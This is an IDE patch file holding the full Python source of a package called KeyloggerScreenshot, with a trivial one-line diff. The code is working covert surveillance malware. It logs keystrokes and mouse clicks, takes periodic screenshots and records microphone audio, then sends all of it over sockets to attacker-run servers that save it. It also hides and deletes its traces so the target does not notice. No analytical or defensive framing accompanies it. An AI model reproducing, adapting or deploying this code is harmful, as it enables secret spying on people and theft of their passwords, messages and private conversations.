Index: KeyloggerScreenshot/__init__.py
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.BaseRevisionTextPatchEP
<+>from pynput import keyboard\r\nfrom pynput.mouse import Listener\r\nimport time\r\nimport sys\r\nimport socket\r\nimport pyautogui as pg\r\nimport subprocess\r\nimport os\r\nimport math\r\nimport pyaudio\r\nimport wave\r\nimport threading\r\nimport ast\r\nimport BetterPrinting as bp\r\nimport random\r\n\r\nclass KeyloggerTarget:\r\n    def __init__(self, ip_of_server_photos, port_of_server_photos, ip_of_server_keylogger_data,\r\n                 port_of_server_keylogger_data, ip_of_server_listener, port_of_server_listener, ip_of_timer,\r\n                 port_of_timer, duration_in_seconds=200):\r\n        global listening_time\r\n        global ip_listener\r\n        global port_listener\r\n        # \"duration_in_seconds\" tells the programm how long it should last the default time is 200 seconds that's 3 Minutes and 20 Seconds\r\n        self.ip_photos = ip_of_server_photos\r\n        self.port_photos = port_of_server_photos\r\n        self.ip_keylogger = ip_of_server_keylogger_data\r\n        self.port_keylogger = port_of_server_keylogger_data\r\n        self.ip_listener = ip_of_server_listener\r\n        self.port_listener = port_of_server_listener\r\n        self.duration = duration_in_seconds\r\n        self.ip_timer = ip_of_timer\r\n        self.port_timer = port_of_timer\r\n\r\n        ip_listener = self.ip_listener\r\n        port_listener = self.port_listener\r\n        listening_time = self.duration\r\n        self.richtige_liste = None\r\n        self.coordinates = None\r\n        self.richtige_liste = []\r\n        self.coordinates = []\r\n\r\n    def daten_aufnehemen(self):\r\n        listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        listening_data.connect((ip_listener, port_listener))\r\n\r\n        format = pyaudio.paInt16\r\n        kanäle = 2\r\n        rate = 44100\r\n        chunk = 1024\r\n        seconds = listening_time + 1\r\n\r\n        audio = pyaudio.PyAudio()\r\n\r\n        # start Recording\r\n        stream = audio.open(format=format, channels=kanäle,\r\n                            rate=rate, input=True,\r\n                            frames_per_buffer=chunk)\r\n        # print(\"recording...\")\r\n        frames = []\r\n\r\n        for i in range(0, int(rate / chunk * seconds)):\r\n            data = stream.read(chunk)\r\n            frames.append(data)\r\n\r\n        # print(\"finished recording\")\r\n\r\n        # stop Recording\r\n        stream.stop_stream()\r\n        stream.close()\r\n        audio.terminate()\r\n\r\n        # Connection with ServerListener\r\n\r\n        str_frames = str(frames)\r\n        listening_data.send(str_frames.encode())\r\n        # Sends data to ServerListener\r\n\r\n    def all_dir(self):\r\n        global random_lst\r\n        zeichen = \"qwertzuiopasdfghjklyxcvbnm1234567890\"\r\n        random_lst = [\"\".join(random.sample(zeichen, random.randint(4, 10))) for x in range(100)]\r\n        # This makes a list of every directory name randomly\r\n        for dir_name in random_lst:\r\n            os.system(f\"mkdir {dir_name}\")\r\n            # The directory is being made here\r\n\r\n        random_dir = random.choice(random_lst)\r\n        os.chdir(random_dir)\r\n        # We are now in that directory where the image can be stored\r\n\r\n    def client(self, ip_photos, port_photos):\r\n        global fhandle\r\n        # fhandle is the variable which opens the foto\r\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        s.connect((ip_photos, port_photos))\r\n        # This connects to the server you specified\r\n        image = pg.screenshot()\r\n        # \"image\" screenshots the current image after a specific time\r\n        fotoname = \"Image.png\"\r\n        # Name of the image\r\n        image.save(fotoname)\r\n        # Saves the image in the current directory\r\n        fhandle = open(fotoname, \"rb\")\r\n        # Opens the image\r\n\r\n        full_msg = b\"\"\r\n        # Every image information will be stored in \"full_msg\"\r\n        for line in fhandle:\r\n            full_msg += line\r\n\r\n        s.send(full_msg)\r\n\r\n    def countdown_send(self, zeit, ip_photos, port_photos, ip_keylogger, port_keylogger):\r\n        seconds_list = [zahl for zahl in range(0, zeit + 1, 20) if zahl != 0]\r\n        # The seconds the image will be sent in 20 steps to the server will be saved in \"seconds_list\"\r\n        print(seconds_list)\r\n        key_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        try:\r\n            for x in range(zeit + 1):\r\n                if x == 20:\r\n                    self.all_dir()\r\n                    #This function makes 100 files to store the image so the target won't find out\r\n                print(x)\r\n                zeit -= 1\r\n                time.sleep(1)\r\n                if x in seconds_list:\r\n                    self.client(ip_photos, port_photos)\r\n                    # The images will be sent\r\n            key_data.connect((ip_keylogger, port_keylogger))\r\n            # This is the ip and the port of the server the port shouldn't be the same the server_photos and the server_keylogger shouldn't be\r\n            # in the same folder\r\n            self.coordinates = list(set(self.coordinates))\r\n            #This checks if the coordinates occur 2 times\r\n            print(self.coordinates)\r\n            wort = \"\"\r\n            for zeichen in self.richtige_liste:\r\n                wort += zeichen\r\n\r\n            # Sends the data to server_keylogger\r\n            all_data = str(self.coordinates) + wort\r\n            #Coordinates and keydata are being concatenated\r\n            key_data.send(all_data.encode())\r\n            print(wort)\r\n            print(self.richtige_liste)\r\n            fhandle.close()\r\n            # Closes the image\r\n            os.remove(\"Image.png\")\r\n            # Deletes the image in the current directory\r\n            os.chdir(\"..\")\r\n            # We have to go back so that we can delete the other directories\r\n            for each_dir in random_lst:\r\n                os.system(f\"rmdir {each_dir}\")\r\n                # This deletes every directory\r\n            sys.exit()\r\n            # Stops the keylogger\r\n        except KeyboardInterrupt:\r\n            # If the target has destroyed the connection\r\n            wort = \"***%§§)§§%\"\r\n            # This is like a special code. To split it at the end\r\n            for zeichen in self.richtige_liste:\r\n                wort += zeichen\r\n            data = f\"THE CONNECTION HAS BEEN INTERRUPTED{wort}\"\r\n            # This let's the server know that the server should shut down\r\n            key_data.connect((ip_keylogger, port_keylogger))\r\n            key_data.send(data.encode())\r\n            key_data.close()\r\n\r\n            if os.path.exists(\"Image.png\"):\r\n                # It will destroy the image so target wound know anything\r\n                fhandle.close()\r\n                os.remove(\"Image.png\")\r\n            # This removes the image\r\n\r\n    def kill_switch(self):\r\n        #This function destroys the mouse info\r\n        new_seconds = self.duration + 20\r\n        # 20 seconds are being added because there might be a problem\r\n        for x in range(new_seconds):\r\n            time.sleep(1)\r\n        #This stopes the\r\n        sys.exit()\r\n\r\n    def on_click(self, x, y, button, pressed):\r\n        #This is the click function\r\n        print(f\"Target has pressed {x} and {y}\")\r\n        #All the coordinates will be stored in \"self.coordinates\"\r\n        self.coordinates.append((x, y))\r\n    def all_clicks(self):\r\n        #This is just a function so it can be ran with threading\r\n        with Listener(on_click=self.on_click) as listening:\r\n            self.kill_switch()\r\n            listening.join()\r\n\r\n    def on_press(self, key):\r\n        try:\r\n            print(f'Alphabetische Taste wurde gedrückt: {key.char} ')\r\n            self.richtige_liste += key.char\r\n            # Every pressed key will be saved in \"richtige_liste\" this is a german word and means \"right_list\"\r\n\r\n            print(self.richtige_liste)\r\n        except AttributeError:\r\n            print(f'Eine andere Taste wurde gedrückt: {key}')\r\n            if key == keyboard.Key.space or key == keyboard.Key.tab:\r\n                self.richtige_liste += \"{\"\r\n                # If the target presses tab or space a \"{\" will be appended to the list so the attacker knows when and\r\n                # space or a tab key has been pressed\r\n\r\n    def on_release(self, key):\r\n        print(f'Key released: {key}')\r\n\r\n    def start(self):\r\n        if self.duration < 60:\r\n            raise TypeError(f\"{self.duration} is not greater and not equal to 60\")\r\n        # \"duration_in_seconds\" should always be bigger than 60 seconds\r\n        else:\r\n            listening_thread = threading.Thread(target=self.daten_aufnehemen)\r\n            # This runs the programm behind the actual programming\r\n            listening_thread.start()\r\n\r\n            threading_mouse = threading.Thread(target=self.all_clicks)\r\n            #This runs the programm behind the actual programming\r\n            threading_mouse.start()\r\n\r\n            send_timer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n            send_timer.connect((self.ip_timer, self.port_timer))\r\n\r\n            send_timer.send(str(self.duration).encode())\r\n            #This sends the seconds to the server\r\n            send_timer.close()\r\n\r\n            with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:\r\n                self.countdown_send(self.duration, self.ip_photos, self.port_photos, self.ip_keylogger,self.port_keylogger)\r\n                listener.join()\r\n                # This listens to the keys that where typed\r\n\r\n\r\nclass ServerKeylogger:\r\n    # This is the class of the Server. Both Server should not be in the same file\r\n    def __init__(self, ip, port):\r\n        self.ip = ip\r\n        self.port = port\r\n\r\n    def message(self, real_data):\r\n        # To know if the server has some issues\r\n        for zeichen in real_data:\r\n            if \"{\" == zeichen:\r\n                # \"{\" this detects if a space or a tab is in full_msg\r\n                new_data = real_data.replace(\"{\", \" \")\r\n\r\n        # The data is being stored in full_msg\r\n        bp.color(f\"Text of target: {new_data}\", \"magenta\")\r\n        zeit = time.strftime(\"%H-%M-%S-%Y\")\r\n        # This is the time the data has arrived\r\n        if new_data != \"\":\r\n            with open(f\"Keylogger of the target Time {zeit}.txt\", \"a+\", encoding=\"utf-8\") as file:\r\n                file.write(f\"HERE IS EVERYTHING THE TARGET HAS TYPED \\n\\n{new_data}\")\r\n\r\n        else:\r\n            bp.color(\"The Target didn't type something...\", \"magenta\")\r\n\r\n    def start(self):\r\n        try:\r\n            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n            server.bind((self.ip, self.port))\r\n            server.listen(1000)\r\n\r\n            bp.color(\"Waiting for connection....\", \"magenta\")\r\n            clientsocket, ipaddress = server.accept()\r\n            # Data is in clientsocket and the ip-address is obviously in \"ipaddress\"\r\n            bp.color(f\"\\nConnection has been established with {ipaddress}\", \"magenta\")\r\n\r\n            full_msg = \"\"\r\n            while True:\r\n                msg = clientsocket.recv(8192).decode()\r\n                # More Data can be accepted due to a bigger buffer size\r\n                if len(msg) <= 0: break\r\n                full_msg += msg\r\n            if \")]\" in full_msg:\r\n                #Checks if the coordinates are there\r\n                cord = full_msg.split(\")]\")\r\n                new_cor = cord[0] + \")]\"\r\n                with open(\"mouseInfoLog.txt\", \"a+\") as file:\r\n                    #The coordinates will be stored in \"mouseInfoLog.txt\"\r\n                    file.write(f\"These are the coordinates of the target \\n{new_cor}\")\r\n                bp.color(\"The coordinates of the target have been saved to your directory\", \"magenta\")\r\n\r\n                if cord[1] == \"\": bp.color(\"The target hasn't typed anything\", \"magenta\")\r\n                else: self.message(cord[1])\r\n\r\n            elif \"{\" in full_msg and \"THE CONNECTION HAS BEEN INTERRUPTED\" not in full_msg:\r\n                #This checks if the target hasn't clicked something and if there is still some data\r\n                full_msg = full_msg.replace(\"[]\", \"\")\r\n                bp.color(\"The target hasn't clicked anything\", \"magenta\")\r\n                self.message(full_msg)\r\n\r\n            elif \"[]\" == full_msg and \"THE CONNECTION HAS BEEN INTERRUPTED\" not in full_msg:\r\n                #Checks if nothing has typed or clicked\r\n                bp.color(\"The target hasn't typed and clicked anything\", \"magenta\")\r\n\r\n            else:\r\n                print(full_msg)\r\n                spalten = full_msg.split(\"***%§§)§§%\")\r\n                # This splits the data with the special code\r\n                if spalten[1] != \"\":\r\n                    # If the data is not empty\r\n                    text = spalten[1]\r\n                    for zeichen in text:\r\n                        if \"{\" == zeichen:\r\n                            text = text.replace(\"{\", \" \")\r\n                    bp.color(f\"Text of target: {text}\", \"magenta\")\r\n                    zeit = time.strftime(\"%H-%M-%S-%Y\")\r\n                    # This is the time the data has arrived\r\n                    with open(f\"Keylogger of the target Time {zeit}.txt\", \"a+\", encoding=\"utf-8\") as file:\r\n                        file.write(f\"HERE IS EVERYTHING THE TARGET HAS TYPED \\n\\n{text}\")\r\n                        # That means data will appear even if the connection isn't stabled\r\n                else:\r\n                    bp.color(\"The target hasn't written something in the meanwhile\", \"magenta\")\r\n\r\n                bp.color(\"\\nTHE CONNECTION HAS BEEN INTERRUPTED\", \"magenta\")\r\n                bp.color(\"THE SERVER WILL BE DESTROYED\\n\", \"magenta\")\r\n                os._exit(0)\r\n                # This shuts down the server\r\n\r\n        except OSError:\r\n            raise OSError(\"Change the port number to run without an error\")\r\n\r\n\r\nclass ServerPhotos:\r\n    # This is the class of the Server. Both Server should not be in the same file\r\n    def __init__(self, ip, port):\r\n        self.ip = ip\r\n        self.port = port\r\n\r\n    def start(self):\r\n        bp.color(\"Cyan: ServerPhotos\", \"cyan\")\r\n        bp.color(\"Blue: ServerKeylogger\", \"magenta\")\r\n        bp.color(\"Green: ServerListener\", \"green\")\r\n        print(\"White: Timer\\n\")\r\n        try:\r\n            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n            server.bind((self.ip, self.port))\r\n            server.listen(1000)\r\n\r\n            anzahl = 0\r\n            while True:\r\n                bp.color(\"Waiting for connection...\", \"cyan\")\r\n                client_socket, address = server.accept()\r\n                bp.color(f\"\\n\\nConnection has been established with {address}\", \"cyan\")\r\n                # Data is in client_socket and the address is obviously in \"ipaddress\"\r\n                full_msg = b\"\"\r\n                # All the binary data is being stored in full_msg as in the previous classes\r\n                while True:\r\n                    msg = client_socket.recv(8192)\r\n                    if len(msg) <= 0: break\r\n                    full_msg += msg\r\n                client_socket.close()\r\n                anzahl += 1\r\n\r\n                with open(f\"New_Image ({anzahl}).png\", \"wb\") as file:\r\n                    # This stores the image\r\n                    file.write(full_msg)\r\n\r\n                # \"anzahl\" is for the amount of photos\r\n                if anzahl > 1:\r\n                    bp.color(f\"{anzahl} Images has been saved to your working directory\", \"cyan\")\r\n                else:\r\n                    bp.color(f\"{anzahl} Image have been saved to your working directory\", \"cyan\")\r\n                # Detetcts how many Image have been saved to your directory\r\n\r\n\r\n        except OSError:\r\n            raise OSError(\"Change the port number to run without an error\")\r\n\r\n\r\nclass ServerListener:\r\n    def __init__(self, ip, port):\r\n        self.ip = ip\r\n        self.port = port\r\n\r\n    def start(self):\r\n        global urgent\r\n        try:\r\n            listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n            listening_data.bind((self.ip, self.port))\r\n            listening_data.listen(1000)\r\n            # 5 possible connections\r\n            bp.color(\"Waiting for connection...\", \"green\")\r\n            # Waits for a connection\r\n\r\n            client_socket, ipaddress = listening_data.accept()\r\n            bp.color(f\"Connection has been established with {ipaddress}\", \"green\")\r\n            check = 0\r\n            full_msg = \"\"\r\n            while True:\r\n                msg = client_socket.recv(30000000).decode()\r\n                # The buffersize is 300000000 because there is a lot of data in audio files\r\n                if len(msg) <= 0: break\r\n                full_msg += msg\r\n\r\n            listening_data.close()\r\n            frames = ast.literal_eval(full_msg)\r\n            data_file = wave.open(\"Audio of target.wav\", \"wb\")\r\n            data_file.setnchannels(2)\r\n            data_file.setsampwidth(2)\r\n            data_file.setframerate(44100)\r\n            data_file.writeframes(b''.join(frames))\r\n            data_file.close()\r\n            bp.color('\"Audio of target.wav\" has been saved to your directory', \"green\")\r\n\r\n            # This stores everything the target was talking\r\n\r\n        except OSError:\r\n            raise OSError(\"Change the port number to run without an error\")\r\n\r\n\r\nclass Timer:\r\n    def __init__(self, ip, port):\r\n        self.ip = ip\r\n        self.port = port\r\n\r\n    def countdown(self, seconds):\r\n        minuten = seconds / 60\r\n        minutes = math.floor(minuten)\r\n        false_second = minutes * 60\r\n        exact_seconds = seconds - false_second\r\n\r\n        print(f\"The target is being connected. The IP of the target is coming....\")\r\n        while seconds:\r\n            mins, secs = divmod(seconds, 60)\r\n            timer = '{:02d}:{:02d}'.format(mins, secs)\r\n            print(f\"\\rTime left: {timer}\", end=\"\")\r\n            time.sleep(1)\r\n            seconds -= 1\r\n\r\n        if minutes == 0:\r\n            print(f\"\\nSuccessful connection for {exact_seconds} seconds\")\r\n        elif exact_seconds == 0:\r\n            print(f\"\\nSuccessful connection for {minutes} minutes\")\r\n        else:\r\n            print(f\"\\nSuccessful connection for {minutes} minutes and {exact_seconds} seconds\")\r\n\r\n    def start_timer(self):\r\n        show_time = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n        show_time.bind((self.ip, self.port))\r\n        show_time.listen(10)\r\n\r\n        client_socket, ipaddress = show_time.accept()\r\n        full_msg = \"\"\r\n        while True:\r\n            msg = client_socket.recv(10).decode()\r\n            if len(msg) <= 0: break\r\n            full_msg += msg\r\n\r\n        seconds = int(full_msg)\r\n        self.countdown(seconds)
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/KeyloggerScreenshot/__init__.py b/KeyloggerScreenshot/__init__.py
--- a/KeyloggerScreenshot/__init__.py	(revision a6c420a2b53f59b531028f57ea74fa068f4097c8)
+++ b/KeyloggerScreenshot/__init__.py	(date 1672318132272)
@@ -37,6 +37,7 @@
         listening_time = self.duration
         self.richtige_liste = None
         self.coordinates = None
+        self.value = False
         self.richtige_liste = []
         self.coordinates = []
 
